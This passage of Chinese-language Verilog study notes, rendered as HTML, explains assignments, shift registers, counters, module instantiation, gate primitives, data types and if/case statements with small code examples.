</span><span id="__span-20-6"><a id="__codelineno-20-6" name="__codelineno-20-6" href="#note-cs-verilog-verilog-__codelineno-20-6"></a><span class="k">always</span><span class="w"> </span><span class="p">@</span><span class="w"> </span><span class="p">(</span><span class="n">A</span><span class="p">,</span><span class="n">B</span><span class="p">,</span><span class="n">C</span><span class="p">)</span>
</span><span id="__span-20-7"><a id="__codelineno-20-7" name="__codelineno-20-7" href="#note-cs-verilog-verilog-__codelineno-20-7"></a><span class="k">begin</span>
</span><span id="__span-20-8"><a id="__codelineno-20-8" name="__codelineno-20-8" href="#note-cs-verilog-verilog-__codelineno-20-8"></a><span class="w">    </span><span class="n">M</span><span class="o">=</span><span class="n">B</span><span class="o">|</span><span class="n">C</span><span class="p">;</span>
</span><span id="__span-20-9"><a id="__codelineno-20-9" name="__codelineno-20-9" href="#note-cs-verilog-verilog-__codelineno-20-9"></a><span class="w">    </span><span class="n">Y</span><span class="o">=</span><span class="n">A</span><span class="o">&amp;</span><span class="n">M</span><span class="p">;</span><span class="w">      </span>
</span><span id="__span-20-10"><a id="__codelineno-20-10" name="__codelineno-20-10" href="#note-cs-verilog-verilog-__codelineno-20-10"></a><span class="k">end</span>
</span><span id="__span-20-11"><a id="__codelineno-20-11" name="__codelineno-20-11" href="#note-cs-verilog-verilog-__codelineno-20-11"></a><span class="k">endmodule</span>
</span></code></pre></div>
(其实也可以直接<code>assign</code>的)</p>
<p>非阻塞赋值实现的移位寄存器<img alt="" src="../NOTE/CS/Verilog/image-1.png" />
  <div class="language-verilog highlight"><pre><span></span><code><span id="__span-21-1"><a id="__codelineno-21-1" name="__codelineno-21-1" href="#note-cs-verilog-verilog-__codelineno-21-1"></a><span class="k">module</span><span class="w"> </span><span class="n">DDF3</span><span class="p">(</span><span class="n">CLK</span><span class="p">,</span><span class="n">D</span><span class="p">,</span><span class="n">Q</span><span class="p">)</span>
</span><span id="__span-21-2"><a id="__codelineno-21-2" name="__codelineno-21-2" href="#note-cs-verilog-verilog-__codelineno-21-2"></a><span class="k">output</span><span class="w"> </span><span class="n">Q</span><span class="p">;</span>
</span><span id="__span-21-3"><a id="__codelineno-21-3" name="__codelineno-21-3" href="#note-cs-verilog-verilog-__codelineno-21-3"></a><span class="k">input</span><span class="w">  </span><span class="n">CLK</span><span class="p">,</span><span class="n">D</span><span class="p">;</span>
</span><span id="__span-21-4"><a id="__codelineno-21-4" name="__codelineno-21-4" href="#note-cs-verilog-verilog-__codelineno-21-4"></a><span class="kt">reg</span><span class="w"> </span><span class="n">a</span><span class="p">,</span><span class="n">b</span><span class="p">,</span><span class="n">Q</span><span class="p">;</span>
</span><span id="__span-21-5"><a id="__codelineno-21-5" name="__codelineno-21-5" href="#note-cs-verilog-verilog-__codelineno-21-5"></a><span class="k">always</span><span class="w"> </span><span class="p">@</span><span class="w"> </span><span class="p">(</span><span class="k">posedge</span><span class="w"> </span><span class="n">CLK</span><span class="p">)</span>
</span><span id="__span-21-6"><a id="__codelineno-21-6" name="__codelineno-21-6" href="#note-cs-verilog-verilog-__codelineno-21-6"></a><span class="k">begin</span>
</span><span id="__span-21-7"><a id="__codelineno-21-7" name="__codelineno-21-7" href="#note-cs-verilog-verilog-__codelineno-21-7"></a><span class="w">  </span><span class="n">a</span><span class="o">&lt;=</span><span class="n">D</span><span class="p">;</span>
</span><span id="__span-21-8"><a id="__codelineno-21-8" name="__codelineno-21-8" href="#note-cs-verilog-verilog-__codelineno-21-8"></a><span class="w">  </span><span class="n">b</span><span class="o">&lt;=</span><span class="n">a</span><span class="p">;</span>
</span><span id="__span-21-9"><a id="__codelineno-21-9" name="__codelineno-21-9" href="#note-cs-verilog-verilog-__codelineno-21-9"></a><span class="w">  </span><span class="n">Q</span><span class="o">&lt;=</span><span class="n">b</span><span class="p">;</span>
</span><span id="__span-21-10"><a id="__codelineno-21-10" name="__codelineno-21-10" href="#note-cs-verilog-verilog-__codelineno-21-10"></a><span class="k">end</span>
</span></code></pre></div>
  这个移位寄存器是每当上升沿到来,同时整体移动的,而不是a先变化,b再变化······</p>
</details>
<p>把<code>assign</code>和<code>always</code>结合起来,举一个4位二进制加法计数器的例子
<div class="language-Verilog highlight"><pre><span></span><code><span id="__span-22-1"><a id="__codelineno-22-1" name="__codelineno-22-1" href="#note-cs-verilog-verilog-__codelineno-22-1"></a><span class="w">  </span><span class="k">module</span><span class="w"> </span><span class="n">CNT4</span><span class="w"> </span><span class="p">(</span><span class="n">CLK</span><span class="p">,</span><span class="n">Q</span><span class="p">);</span>
</span><span id="__span-22-2"><a id="__codelineno-22-2" name="__codelineno-22-2" href="#note-cs-verilog-verilog-__codelineno-22-2"></a><span class="w">  </span><span class="k">input</span><span class="w"> </span><span class="n">CLK</span><span class="p">;</span>
</span><span id="__span-22-3"><a id="__codelineno-22-3" name="__codelineno-22-3" href="#note-cs-verilog-verilog-__codelineno-22-3"></a><span class="w">  </span><span class="k">output</span><span class="w"> </span><span class="p">[</span><span class="mh">3</span><span class="o">:</span><span class="mh">0</span><span class="p">]</span><span class="w"> </span><span class="n">Q</span><span class="p">;</span>
</span><span id="__span-22-4"><a id="__codelineno-22-4" name="__codelineno-22-4" href="#note-cs-verilog-verilog-__codelineno-22-4"></a>
</span><span id="__span-22-5"><a id="__codelineno-22-5" name="__codelineno-22-5" href="#note-cs-verilog-verilog-__codelineno-22-5"></a><span class="w">  </span><span class="kt">reg</span><span class="w"> </span><span class="p">[</span><span class="mh">3</span><span class="o">:</span><span class="mh">0</span><span class="p">]</span><span class="w"> </span><span class="n">Q1</span><span class="p">;</span>
</span><span id="__span-22-6"><a id="__codelineno-22-6" name="__codelineno-22-6" href="#note-cs-verilog-verilog-__codelineno-22-6"></a>
</span><span id="__span-22-7"><a id="__codelineno-22-7" name="__codelineno-22-7" href="#note-cs-verilog-verilog-__codelineno-22-7"></a><span class="w">  </span><span class="k">always</span><span class="w"> </span><span class="p">@</span><span class="w"> </span><span class="p">(</span><span class="k">posedge</span><span class="w"> </span><span class="n">CLK</span><span class="p">)</span>
</span><span id="__span-22-8"><a id="__codelineno-22-8" name="__codelineno-22-8" href="#note-cs-verilog-verilog-__codelineno-22-8"></a><span class="w">  </span><span class="k">begin</span>
</span><span id="__span-22-9"><a id="__codelineno-22-9" name="__codelineno-22-9" href="#note-cs-verilog-verilog-__codelineno-22-9"></a><span class="w">    </span><span class="n">Q1</span><span class="o">&lt;=</span><span class="n">Q1</span><span class="o">+</span><span class="mh">1</span><span class="p">;</span>
</span><span id="__span-22-10"><a id="__codelineno-22-10" name="__codelineno-22-10" href="#note-cs-verilog-verilog-__codelineno-22-10"></a><span class="w">  </span><span class="k">end</span>
</span><span id="__span-22-11"><a id="__codelineno-22-11" name="__codelineno-22-11" href="#note-cs-verilog-verilog-__codelineno-22-11"></a>
</span><span id="__span-22-12"><a id="__codelineno-22-12" name="__codelineno-22-12" href="#note-cs-verilog-verilog-__codelineno-22-12"></a><span class="w">  </span><span class="k">assign</span><span class="w"> </span><span class="n">Q</span><span class="o">=</span><span class="n">Q1</span><span class="p">;</span>
</span><span id="__span-22-13"><a id="__codelineno-22-13" name="__codelineno-22-13" href="#note-cs-verilog-verilog-__codelineno-22-13"></a>
</span><span id="__span-22-14"><a id="__codelineno-22-14" name="__codelineno-22-14" href="#note-cs-verilog-verilog-__codelineno-22-14"></a><span class="w">  </span><span class="k">endmodule</span>
</span></code></pre></div>
此程序中有<code>always</code>和<code>assign</code>两条语句,他们之间是并行的;有一个内部变量Q1,使用时要进行声明;</p>
<h2 id="note-cs-verilog-verilog-_1">底层模块调用<a class="headerlink" href="#note-cs-verilog-verilog-_1" title="Permanent link">&para;</a></h2>
<p>类似于C语言里面的函数调用,Verilog中也有模块的调用,调用的格式为:<strong>底层模块名 例化名 (端口映射);</strong></p>
<details class="example">
<summary>Example</summary>
<p>实现如下电路</p>
<p><img alt="" src="../NOTE/CS/Verilog/image-2.png" /></p>
<p>先定义好D触发器,然后再设计顶层电路,在顶层电路中可调用底层模块.
<div class="language-Verilog highlight"><pre><span></span><code><span id="__span-23-1"><a id="__codelineno-23-1" name="__codelineno-23-1" href="#note-cs-verilog-verilog-__codelineno-23-1"></a><span class="k">module</span><span class="w"> </span><span class="n">DFF</span><span class="p">(</span><span class="n">CLK</span><span class="p">,</span><span class="n">D</span><span class="p">,</span><span class="n">Q</span><span class="p">)</span>
</span><span id="__span-23-2"><a id="__codelineno-23-2" name="__codelineno-23-2" href="#note-cs-verilog-verilog-__codelineno-23-2"></a><span class="k">output</span><span class="w"> </span><span class="kt">reg</span><span class="w"> </span><span class="n">Q</span><span class="p">;</span>
</span><span id="__span-23-3"><a id="__codelineno-23-3" name="__codelineno-23-3" href="#note-cs-verilog-verilog-__codelineno-23-3"></a><span class="k">input</span><span class="w"> </span><span class="n">CLK</span><span class="p">,</span><span class="n">D</span><span class="p">;</span>
</span><span id="__span-23-4"><a id="__codelineno-23-4" name="__codelineno-23-4" href="#note-cs-verilog-verilog-__codelineno-23-4"></a><span class="k">always</span><span class="w"> </span><span class="p">@</span><span class="w"> </span><span class="p">(</span><span class="k">posedge</span><span class="w"> </span><span class="n">CLK</span><span class="p">)</span>
</span><span id="__span-23-5"><a id="__codelineno-23-5" name="__codelineno-23-5" href="#note-cs-verilog-verilog-__codelineno-23-5"></a><span class="w">    </span><span class="n">Q</span><span class="o">&lt;=</span><span class="n">D</span><span class="p">;</span>
</span><span id="__span-23-6"><a id="__codelineno-23-6" name="__codelineno-23-6" href="#note-cs-verilog-verilog-__codelineno-23-6"></a><span class="k">endmodule</span>
</span></code></pre></div>
然后,在顶层模块中调用
<div class="language-Verilog highlight"><pre><span></span><code><span id="__span-24-1"><a id="__codelineno-24-1" name="__codelineno-24-1" href="#note-cs-verilog-verilog-__codelineno-24-1"></a><span class="k">module</span><span class="w"> </span><span class="n">examp</span><span class="w"> </span><span class="p">(</span><span class="n">clk</span><span class="p">,</span><span class="n">d</span><span class="p">,</span><span class="n">a</span><span class="p">,</span><span class="n">q</span><span class="p">)</span>
</span><span id="__span-24-2"><a id="__codelineno-24-2" name="__codelineno-24-2" href="#note-cs-verilog-verilog-__codelineno-24-2"></a><span class="k">output</span><span class="w">  </span><span class="n">q</span><span class="p">;</span>
</span><span id="__span-24-3"><a id="__codelineno-24-3" name="__codelineno-24-3" href="#note-cs-verilog-verilog-__codelineno-24-3"></a><span class="k">input</span><span class="w"> </span><span class="n">clk</span><span class="p">,</span><span class="n">d</span><span class="p">,</span><span class="n">a</span><span class="p">;</span>
</span><span id="__span-24-4"><a id="__codelineno-24-4" name="__codelineno-24-4" href="#note-cs-verilog-verilog-__codelineno-24-4"></a><span class="kt">wire</span><span class="w"> </span><span class="n">d1</span><span class="p">;</span>
</span><span id="__span-24-5"><a id="__codelineno-24-5" name="__codelineno-24-5" href="#note-cs-verilog-verilog-__codelineno-24-5"></a><span class="kt">wire</span><span class="w"> </span><span class="n">q1</span><span class="p">;</span>
</span><span id="__span-24-6"><a id="__codelineno-24-6" name="__codelineno-24-6" href="#note-cs-verilog-verilog-__codelineno-24-6"></a><span class="n">DFF</span><span class="w"> </span><span class="n">dff1</span><span class="p">(.</span><span class="n">CLK</span><span class="p">(</span><span class="n">clk</span><span class="p">),.</span><span class="n">D</span><span class="p">(</span><span class="n">d1</span><span class="p">),.</span><span class="n">Q</span><span class="p">(</span><span class="n">q1</span><span class="p">));</span>
</span><span id="__span-24-7"><a id="__codelineno-24-7" name="__codelineno-24-7" href="#note-cs-verilog-verilog-__codelineno-24-7"></a><span class="n">DFF</span><span class="w"> </span><span class="n">dff2</span><span class="p">(</span><span class="n">q1</span><span class="p">,</span><span class="n">d</span><span class="p">,</span><span class="n">q</span><span class="p">);</span>
</span><span id="__span-24-8"><a id="__codelineno-24-8" name="__codelineno-24-8" href="#note-cs-verilog-verilog-__codelineno-24-8"></a><span class="k">or</span><span class="w"> </span><span class="p">(</span><span class="n">d1</span><span class="p">,</span><span class="n">a</span><span class="p">,</span><span class="n">q</span><span class="p">);</span>
</span><span id="__span-24-9"><a id="__codelineno-24-9" name="__codelineno-24-9" href="#note-cs-verilog-verilog-__codelineno-24-9"></a><span class="k">endmodule</span>
</span></code></pre></div>
为了调用底层模块,需要加两个内部变量d1和q1,并给两次调用的模块进行命名,调用时例化名不能省略.</p>
</details>
<p><strong>端口映射</strong></p>
<ul>
<li>
<p>端口名关联法(命名法),将模块的端口和调用模块的环境中的变量对应起来, <strong>即(.底层端口名1(外接信号名1),.底层端口名2(外接信号名2),…)</strong> 
<code>DFF dff1(.CLK(clk),.D(d1),.Q(q1));</code>,这样的方法因为有名字对应,不必按照模块的端口列表排序.</p>
</li>
<li>
<p>位置关联法(顺序法):将模块的端口以及要接的外部信号按照模块定义的顺序一一对应起来(外接信号名1,外接信号名2,…)
  <code>DFF dff2(q1,d,q);</code>,<strong>这样的方法必须严格按照底层模块的端口信号列表顺序书写</strong></p>
</li>
</ul>
<h2 id="note-cs-verilog-verilog-_2">门原语调用<a class="headerlink" href="#note-cs-verilog-verilog-_2" title="Permanent link">&para;</a></h2>
<p><strong>Verilog</strong> 语言语言提供已经设计好的门,称为门原语(primitive,共12个),这些门可直接调用,不用再对其进行功能描述.</p>
<p><strong>门原语调用格式：</strong> 门原语名    实例名  (端口连接)</p>
<div class="admonition note">
<p class="admonition-title">Note</p>
<p>和模块调用不同,实例名可以省略,端口连接只能采用顺序法,<strong>输出在前,输入在后.</strong></p>
</div>
<p><strong>常见的门原语</strong></p>
<ul>
<li>
<p>与门等6个:<code>and</code>,<code>or</code>,<code>xor</code>,<code>nand</code>,<code>nor</code>,<code>xnor</code>.用法例如<code>and (out,in1,in2,in3···)</code>,第一个是输出,后面跟着输入,输入不限制个数</p>
</li>
<li>
<p>非门:<code>not</code>,用法例如<code>not (OUT,IN)</code></p>
</li>
<li>
<p>缓冲器:<code>buf</code>,用法例如<code>buf b1_2out(OUT1, OUT2, IN);</code>,前面是输出,最后一个是输入,输出个数不限.</p>
</li>
<li>
<p>三态门</p>
<ul>
<li>bufif1(控制端1有效缓冲器) </li>
<li>bufif0 (控制端0有效缓冲器)</li>
<li>notif1(控制端1有效非门)</li>
<li>notif0(控制端0有效非门)</li>
<li>端口列表中前面是输出,中间是输入,最后是使能端,输出个数不限</li>
</ul>
</li>
</ul>
<details class="hint">
<summary>Hint</summary>
<p><img alt="" src="../NOTE/CS/Verilog/image-3.png" />
<div class="language-Verilog highlight"><pre><span></span><code><span id="__span-25-1"><a id="__codelineno-25-1" name="__codelineno-25-1" href="#note-cs-verilog-verilog-__codelineno-25-1"></a><span class="k">bufif1</span><span class="w"> </span><span class="n">b1</span><span class="w"> </span><span class="p">(</span><span class="n">out</span><span class="p">,</span><span class="w"> </span><span class="n">in</span><span class="p">,</span><span class="w"> </span><span class="n">ctrl</span><span class="p">);</span>
</span><span id="__span-25-2"><a id="__codelineno-25-2" name="__codelineno-25-2" href="#note-cs-verilog-verilog-__codelineno-25-2"></a><span class="k">bufif0</span><span class="w"> </span><span class="n">b0</span><span class="w"> </span><span class="p">(</span><span class="n">out</span><span class="p">,</span><span class="w"> </span><span class="n">in</span><span class="p">,</span><span class="w"> </span><span class="n">ctrl</span><span class="p">);</span>
</span><span id="__span-25-3"><a id="__codelineno-25-3" name="__codelineno-25-3" href="#note-cs-verilog-verilog-__codelineno-25-3"></a><span class="k">notif1</span><span class="w"> </span><span class="n">n1</span><span class="w"> </span><span class="p">(</span><span class="n">out</span><span class="p">,</span><span class="w"> </span><span class="n">in</span><span class="p">,</span><span class="w"> </span><span class="n">ctrl</span><span class="p">);</span>
</span><span id="__span-25-4"><a id="__codelineno-25-4" name="__codelineno-25-4" href="#note-cs-verilog-verilog-__codelineno-25-4"></a><span class="k">notif0</span><span class="w"> </span><span class="n">n0</span><span class="w"> </span><span class="p">(</span><span class="n">out</span><span class="p">,</span><span class="w"> </span><span class="n">in</span><span class="p">,</span><span class="w"> </span><span class="n">ctrl</span><span class="p">);</span>
</span></code></pre></div></p>
</details>
<h2 id="note-cs-verilog-verilog-verilog_1">Verilog中的数据类型<a class="headerlink" href="#note-cs-verilog-verilog-verilog_1" title="Permanent link">&para;</a></h2>
<p>Verilog中的数据类型分为两大类:net(线网)类和variable(变量)类</p>
<div class="admonition note">
<p class="admonition-title">Note</p>
<p>因连续赋值语句和过程赋值语句的激活特点不同,故赋值目标特点也不同,前者不需要保存,后者需要保存,因此规定两种数据类型,<strong>net型用于连续赋值的赋值目标或门原语的输出</strong>,且仿真时不需要分配内存空间,<strong>variable用于过程赋值的赋值目标</strong>,且仿真时需要分配内存空间.</p>
</div>
<ul>
<li>net 类中的数据类型(常用wire)</li>
</ul>
<table>
<thead>
<tr>
<th>wire(线型)</th>
<th>tri(三态)</th>
<th>tri0(下拉电阻)</th>
<th>supply0(地)</th>
</tr>
</thead>
<tbody>
<tr>
<td>wand(线与)</td>
<td>triand(三态与)</td>
<td>tri1(上拉电阻)</td>
<td>supply1(电源)</td>
</tr>
<tr>
<td>wor(线或)</td>
<td>trior(三态或)</td>
<td>trireg(电容性线网)</td>
<td></td>
</tr>
</tbody>
</table>
<ul>
<li>Variable类中的数据类型(常用reg)</li>
</ul>
<table>
<thead>
<tr>
<th>reg(寄存器型)</th>
<th></th>
</tr>
</thead>
<tbody>
<tr>
<td>integer(整型)</td>
<td>time(时间型)</td>
</tr>
<tr>
<td>real(实型)</td>
<td>realtime(实时间型)</td>
</tr>
</tbody>
</table>
<details class="info">
<summary>Info</summary>
<p>将一个信号定义成net型还是varible型,由以下两方面决定</p>
<p>a.使用何种赋值语句对该信号进行赋值,如果是连续赋值或门原语赋值或例化语句赋值,则定义成net型;如果是过程赋值则定义成variable型.</p>
<p>b.对于端口信号来说,input信号和inout信号必须定义成net型的;output信号可以是net型的也可以是variable型的,决定于如何对其赋值(同a).</p>
<p><img alt="" src="../NOTE/CS/Verilog/image-4.png" /></p>
</details>
<div class="admonition example">
<p class="admonition-title">Example</p>
<p><img alt="alt text" src="../NOTE/CS/Verilog/image-6.png" /></p>
<p>该图中d和e的赋值有三种方法</p>
<ul>
<li>
<p>使用连续赋值语句
  <div class="language-Verilog highlight"><pre><span></span><code><span id="__span-26-1"><a id="__codelineno-26-1" name="__codelineno-26-1" href="#note-cs-verilog-verilog-__codelineno-26-1"></a><span class="k">assign</span><span class="w"> </span><span class="n">d</span><span class="o">=</span><span class="n">a</span><span class="o">&amp;</span><span class="n">b</span><span class="p">;</span>
</span><span id="__span-26-2"><a id="__codelineno-26-2" name="__codelineno-26-2" href="#note-cs-verilog-verilog-__codelineno-26-2"></a><span class="k">assign</span><span class="w"> </span><span class="n">e</span><span class="o">=</span><span class="n">d</span><span class="o">|</span><span class="n">c</span><span class="p">;</span>
</span></code></pre></div>
  此时,d和e必须定义为net类的</p>
</li>
<li>
<p>使用门原语赋值
  <div class="language-Verilog highlight"><pre><span></span><code><span id="__span-27-1"><a id="__codelineno-27-1" name="__codelineno-27-1" href="#note-cs-verilog-verilog-__codelineno-27-1"></a><span class="k">and</span><span class="w"> </span><span class="p">(</span><span class="n">d</span><span class="p">,</span><span class="n">a</span><span class="p">,</span><span class="n">b</span><span class="p">);</span>
</span><span id="__span-27-2"><a id="__codelineno-27-2" name="__codelineno-27-2" href="#note-cs-verilog-verilog-__codelineno-27-2"></a><span class="k">or</span><span class="w"> </span><span class="p">(</span><span class="n">e</span><span class="p">,</span><span class="n">d</span><span class="p">,</span><span class="n">c</span><span class="p">);</span>
</span></code></pre></div>
  此时,d和e也必须是net类的</p>
</li>
<li>
<p>使用过程赋值语句
<div class="language-verilog highlight"><pre><span></span><code><span id="__span-28-1"><a id="__codelineno-28-1" name="__codelineno-28-1" href="#note-cs-verilog-verilog-__codelineno-28-1"></a><span class="w">   </span><span class="k">always</span><span class="w"> </span><span class="p">@(</span><span class="n">a</span><span class="p">,</span><span class="n">b</span><span class="p">,</span><span class="n">d</span><span class="p">,</span><span class="n">c</span><span class="p">)</span>
</span><span id="__span-28-2"><a id="__codelineno-28-2" name="__codelineno-28-2" href="#note-cs-verilog-verilog-__codelineno-28-2"></a><span class="w">    </span><span class="k">begin</span>
</span><span id="__span-28-3"><a id="__codelineno-28-3" name="__codelineno-28-3" href="#note-cs-verilog-verilog-__codelineno-28-3"></a><span class="w">      </span><span class="n">d</span><span class="o">=</span><span class="n">a</span><span class="o">&amp;</span><span class="n">b</span><span class="p">;</span>
</span><span id="__span-28-4"><a id="__codelineno-28-4" name="__codelineno-28-4" href="#note-cs-verilog-verilog-__codelineno-28-4"></a><span class="w">      </span><span class="n">e</span><span class="o">=</span><span class="n">d</span><span class="o">|</span><span class="n">c</span><span class="p">;</span>
</span><span id="__span-28-5"><a id="__codelineno-28-5" name="__codelineno-28-5" href="#note-cs-verilog-verilog-__codelineno-28-5"></a><span class="w">    </span><span class="k">end</span>
</span></code></pre></div>
此时d和e必须是reg类型的.</p>
</li>
</ul>
<p>我们也可以在这里回忆一下,这里d先改变了,e会受到d的影响,所以需要使用阻塞赋值. </p>
</div>
<h2 id="note-cs-verilog-verilog-verilog_2">Verilog中数字的表示格式以及逻辑值<a class="headerlink" href="#note-cs-verilog-verilog-verilog_2" title="Permanent link">&para;</a></h2>
<ul>
<li>无符号数的表示方法:<code>位宽</code>+<code>'</code>+<code>进制</code>+<code>数字</code>(5'd8,五位十进制8,也就是<span class="arithmatex">\((01000)_2\)</span>)</li>
<li>有符号数的表示方法:<code>位宽</code>+<code>'</code>+<code>sb</code>+<code>数字</code>(8'sb10111011,第一位是符号位,是<span class="arithmatex">\(-(01000101)_2=-69_{10}\)</span>)</li>
<li>Verilog语言中的逻辑值有四种:<ul>
<li>1：逻辑1，高电平，数字1</li>
<li>0：逻辑0，低电平，数字0</li>
<li>x：不确定</li>
<li>z：高阻态</li>
</ul>
</li>
</ul>
<h2 id="note-cs-verilog-verilog-if">if语句<a class="headerlink" href="#note-cs-verilog-verilog-if" title="Permanent link">&para;</a></h2>
<p>Verilog中有四种类型的if语句,大致也跟C语言类似</p>
<ul>
<li><code>if(&lt;条件表达式&gt;)语句;</code></li>
<li><code>if(&lt;条件表达式&gt;)真语句;else 假语句;</code></li>
<li><code>verilog
  if (&lt;条件表达式1&gt;)语句1;
  else if (&lt;条件表达式2&gt;)语句2 ;
  else if (&lt;条件表达式3&gt;)语句3 ;</code></li>
<li>
<p><code>Verilog
  if (&lt;条件表达式1&gt;)语句1 ;
  else if (&lt;条件表达式2&gt;)语句2 ;
  else if (&lt;条件表达式3&gt;)语句3 ;
  else 默认语句 ;</code></p>
</li>
<li>
<p>多条语句时使用<code>begin</code> <code>end</code></p>
</li>
</ul>
<div class="admonition eexample">
<p class="admonition-title">Eexample</p>
<p>计数器
<div class="language-Verilog highlight"><pre><span></span><code><span id="__span-29-1"><a id="__codelineno-29-1" name="__codelineno-29-1" href="#note-cs-verilog-verilog-__codelineno-29-1"></a><span class="k">always</span><span class="w"> </span><span class="p">@(</span><span class="k">posedge</span><span class="w"> </span><span class="n">CLK</span><span class="p">)</span>
</span><span id="__span-29-2"><a id="__codelineno-29-2" name="__codelineno-29-2" href="#note-cs-verilog-verilog-__codelineno-29-2"></a><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="n">RST</span><span class="p">)</span><span class="w"> </span><span class="n">Q</span><span class="o">=</span><span class="mh">0</span><span class="p">;</span>
</span><span id="__span-29-3"><a id="__codelineno-29-3" name="__codelineno-29-3" href="#note-cs-verilog-verilog-__codelineno-29-3"></a><span class="k">else</span><span class="w"> </span><span class="n">Q</span><span class="o">=</span><span class="n">Q</span><span class="o">+</span><span class="mh">1</span><span class="p">;</span><span class="w">  </span>
</span></code></pre></div></p>
</div>
<details class="danger">
<summary>Danger</summary>
<p>在用if语句设计“组合电路”时要注意，如果条件不完整，会综合出寄存器。</p>
<p>使条件完整的两种方法:</p>
<ul>
<li>加else</li>
<li>设初值</li>
</ul>
<p><img alt="alt text" src="../NOTE/CS/Verilog/image-7.png" /></p>
<div class="language-Verilog highlight"><pre><span></span><code><span id="__span-30-1"><a id="__codelineno-30-1" name="__codelineno-30-1" href="#note-cs-verilog-verilog-__codelineno-30-1"></a><span class="k">always</span><span class="w"> </span><span class="p">@(</span><span class="n">a</span><span class="p">,</span><span class="n">b</span><span class="p">)</span>
</span><span id="__span-30-2"><a id="__codelineno-30-2" name="__codelineno-30-2" href="#note-cs-verilog-verilog-__codelineno-30-2"></a><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">sel</span><span class="p">)</span><span class="w"> </span><span class="n">Q</span><span class="o">=</span><span class="n">a</span><span class="p">;</span>
</span><span id="__span-30-3"><a id="__codelineno-30-3" name="__codelineno-30-3" href="#note-cs-verilog-verilog-__codelineno-30-3"></a><span class="k">else</span><span class="w">      </span><span class="n">Q</span><span class="o">=</span><span class="n">b</span><span class="p">;</span>
</span></code></pre></div>
<p><code>Verilog
always @(a,b)
Q=a;
if (sel) Q=b;</code></p>
</details>
<ul>
<li>条件表达式格式:(计算表达式),计算表达式可以是任意形式的表达式；条件表达式的结果只有0和1两种，如果计算表达式的值为0，则条件表达式的值为0，否则为1。</li>
</ul>
<p>例如,设a=1000,b=0110</p>
<table>
<thead>
<tr>
<th>条件表达式</th>
<th>计算表达式</th>
<th>结果</th>
</tr>
</thead>
<tbody>
<tr>
<td>if (a==b)</td>
<td>0</td>
<td>0</td>
</tr>
<tr>
<td>if (a&gt;b)</td>
<td>1</td>
<td>1</td>
</tr>
<tr>
<td>if (a)</td>
<td>1000</td>
<td>1</td>
</tr>
<tr>
<td>if (a*b)</td>
<td>11_0000(前两位被截掉)</td>
<td>0</td>
</tr>
<tr>
<td>if (a</td>
<td>b)</td>
<td>1110</td>
</tr>
<tr>
<td>if (a&amp;b)</td>
<td>0000</td>
<td>0</td>
</tr>
</tbody>
</table>
<h2 id="note-cs-verilog-verilog-case">Case 语句<a class="headerlink" href="#note-cs-verilog-verilog-case" title="Permanent link">&para;</a></h2>
<p>功能类似于C语言中的<code>switch case</code>语句</p>
<p>格式:
<div class="language-Verilog highlight"><pre><span></span><code><span id="__span-31-1"><a id="__codelineno-31-1" name="__codelineno-31-1" href="#note-cs-verilog-verilog-__codelineno-31-1"></a><span class="w">    </span><span class="k">case</span><span class="w"> </span><span class="p">(</span><span class="err">表达式</span><span class="p">)</span>
</span><span id="__span-31-2"><a id="__codelineno-31-2" name="__codelineno-31-2" href="#note-cs-verilog-verilog-__codelineno-31-2"></a><span class="w">    </span><span class="err">取值</span><span class="mh">1</span><span class="o">:</span><span class="w"> </span><span class="err">语句</span><span class="mh">1</span><span class="p">;</span>
</span><span id="__span-31-3"><a id="__codelineno-31-3" name="__codelineno-31-3" href="#note-cs-verilog-verilog-__codelineno-31-3"></a><span class="w">    </span><span class="err">取值</span><span class="mh">2</span><span class="o">:</span><span class="w"> </span><span class="err">语句</span><span class="mh">2</span><span class="p">;</span>
</span><span id="__span-31-4"><a id="__codelineno-31-4" name="__codelineno-31-4" href="#note-cs-verilog-verilog-__codelineno-31-4"></a><span class="w">    </span><span class="err">取值</span><span class="mh">3</span><span class="o">:</span><span class="w"> </span><span class="err">语句</span><span class="mh">3</span><span class="p">;</span>
</span><span id="__span-31-5"><a id="__codelineno-31-5" name="__codelineno-31-5" href="#note-cs-verilog-verilog-__codelineno-31-5"></a><span class="w">    </span><span class="p">...</span>
</span><span id="__span-31-6"><a id="__codelineno-31-6" name="__codelineno-31-6" href="#note-cs-verilog-verilog-__codelineno-31-6"></a><span class="w">    </span><span class="p">...</span>
</span><span id="__span-31-7"><a id="__codelineno-31-7" name="__codelineno-31-7" href="#note-cs-verilog-verilog-__codelineno-31-7"></a><span class="w">    </span><span class="k">default</span><span class="o">:</span><span class="w"> </span><span class="err">默认语句</span><span class="p">;</span>
</span><span id="__span-31-8"><a id="__codelineno-31-8" name="__codelineno-31-8" href="#note-cs-verilog-verilog-__codelineno-31-8"></a><span class="w">    </span><span class="k">endcase</span>
</span></code></pre></div></p>
<p><code>default</code>语句可加可不加,但是要注意条件的完整性</p>
<h2 id="note-cs-verilog-verilog-verilog_3">Verilog的语言描述风格<a class="headerlink" href="#note-cs-verilog-verilog-verilog_3" title="Permanent link">&para;</a></h2>
<ul>
<li>结构化描述(也称门级描述,全部使用门原语和底层模块调用)</li>
<li>数据流级描述(全部用<code>assign</code> 语句)</li>
<li>行为级描述(全部用<code>always</code>语句配合<code>if``case</code>语句等)</li>
<li>RTL级描述方式(数据流级+行为级，可综合)</li>
<li>实际描述是三种混合的</li>
</ul>
<div class="admonition example 四选一选择器的多种verilog表示方法">
<p class="admonition-title">Example</p>
<p><img alt="" src="../NOTE/CS/Verilog/image-8.png" />
门级描述
<div class="language-Verilog highlight"><pre><span></span><code><span id="__span-32-1"><a id="__codelineno-32-1" name="__codelineno-32-1" href="#note-cs-verilog-verilog-__codelineno-32-1"></a><span class="k">module</span><span class="w"> </span><span class="n">mux4_to_1</span><span class="w"> </span><span class="p">(</span><span class="n">out</span><span class="p">,</span><span class="w"> </span><span class="n">i0</span><span class="p">,</span><span class="w"> </span><span class="n">i1</span><span class="p">,</span><span class="w"> </span><span class="n">i2</span><span class="p">,</span><span class="w"> </span><span class="n">i3</span><span class="p">,</span><span class="w"> </span><span class="n">s1</span><span class="p">,</span><span class="w"> </span><span class="n">s0</span><span class="p">);</span>
</span><span id="__span-32-2"><a id="__codelineno-32-2" name="__codelineno-32-2" href="#note-cs-verilog-verilog-__codelineno-32-2"></a><span class="k">output</span><span class="w"> </span><span class="n">out</span><span class="p">;</span>
